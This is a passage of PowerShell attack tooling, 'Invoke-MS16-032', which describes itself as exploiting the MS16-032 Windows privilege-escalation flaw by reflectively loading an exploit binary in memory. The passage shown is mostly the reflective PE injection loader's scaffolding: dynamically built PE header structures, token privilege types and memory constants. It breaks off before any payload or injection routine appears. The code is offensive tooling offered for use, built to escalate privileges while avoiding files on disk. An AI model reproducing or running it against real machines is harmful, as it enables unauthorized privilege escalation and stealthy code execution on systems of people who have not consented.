$scriptblock = 
{
function Invoke-MS16-032
{
<#
.SYNOPSIS

This script leverages MS16-032 and Invoke-ReflectivePEInjection to reflectively load MS16-032 PE completely in memory. 

.DESCRIPTION

This script leverages MS16-032 and Invoke-ReflectivePEInjection to reflectively load MS16-032 PE completely in memory. 

.PARAMETER Command

Supply a custom command line.

.PARAMETER ComputerName

Optional, an array of computernames to run the script on.

#>

Param(

    [Parameter(ParameterSetName = "CustomCommand", Position = 0)]
    [String]
    $Command
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$PEBytes64,

        [Parameter(Position = 1, Mandatory = $true)]
		[String]
		$PEBytes32,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[String]
		$FuncReturnType,
				
		[Parameter(Position = 3, Mandatory = $false)]
		[Int32]
		$ProcId,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[String]
		$ProcName,

        [Parameter(Position = 5, Mandatory = $false)]
        [String]
        $ExeArgs
	)
	
	###################################
	##########  Win32 Stuff  ##########
	###################################
	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		#Define all the structures/enums that will be used
		#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


		############    ENUM    ############
		#Enum MachineType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

		#Enum MagicType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

		#Enum SubSystemType
		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

		#Enum DllCharacteristicsType
		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

		###########    STRUCT    ###########
		#Struct IMAGE_DATA_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

		#Struct IMAGE_FILE_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

		#Struct IMAGE_OPTIONAL_HEADER64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

		#Struct IMAGE_OPTIONAL_HEADER32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

		#Struct IMAGE_NT_HEADERS64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
		
		#Struct IMAGE_NT_HEADERS32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

		#Struct IMAGE_DOS_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

		#Struct IMAGE_SECTION_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

		#Struct IMAGE_BASE_RELOCATION
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

		#Struct IMAGE_IMPORT_DESCRIPTOR
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

		#Struct IMAGE_EXPORT_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
		
		#Struct LUID
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		#Struct LUID_AND_ATTRIBUTES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
		
		#Struct TOKEN_PRIVILEGES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object
		
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
